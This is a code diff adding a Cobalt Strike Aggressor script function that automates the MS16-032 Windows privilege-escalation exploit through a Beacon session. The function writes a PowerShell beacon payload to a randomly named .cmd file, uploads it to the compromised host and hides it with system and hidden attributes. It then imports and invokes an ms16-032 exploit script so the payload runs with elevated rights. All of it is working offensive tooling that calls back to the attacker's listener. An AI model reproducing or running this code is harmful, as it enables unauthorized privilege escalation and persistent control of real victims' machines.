@@ -1,0 +1,24 @@
+sub ms16032{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via ms16-032");
+    local('$Rch $payload $fname');
+    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
+    $total = 8;
+    while($total >= 0){
+        $fname = $fname.rand(@array);
+        $total = $total - 1;
+    }
+    $fname = $fname.".cmd";
+    $Rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, $fname);
+    bshell!($bid, "attrib \" $+ $fname\" +s +h");
+    bpowershell_import!($bid, script_resource("bin/ms16-032.ps1"));
+    bpowershell!($bid, "Invoke-MS16-032  $+ $fname");
+    exec("cmd.exe /C del /F ".$fname);
+}
